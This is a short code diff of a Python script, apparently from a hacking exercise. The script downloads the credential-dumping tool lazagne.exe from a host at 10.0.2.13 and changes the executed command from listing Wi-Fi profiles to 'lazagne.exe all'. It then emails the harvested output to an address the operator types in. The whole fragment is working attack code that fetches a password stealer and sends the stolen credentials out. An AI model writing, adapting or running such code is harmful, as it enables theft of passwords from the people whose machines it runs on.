@@ -20,7 +20,6 @@ def send_email(email, password, message):
     #(from_addr, to_addr, message)
     server.quit()
     
-    
 download("http://10.0.2.13/hackfiles/lazagne.exe")
 #download("http://rarlab.com/rar/wrar571.exe")
 #download("http://vulnweb.com/acunetix-logo.png")
@@ -28,6 +27,7 @@ download("http://10.0.2.13/hackfiles/lazagne.exe")
 email = input("Enter email address to send to: ")
 password = input("Enter email password: ")
 
-command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
+#command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
+command = "lazagne.exe all"
 result = subprocess.check_output(command, shell=True)
 send_email(email, password, result)
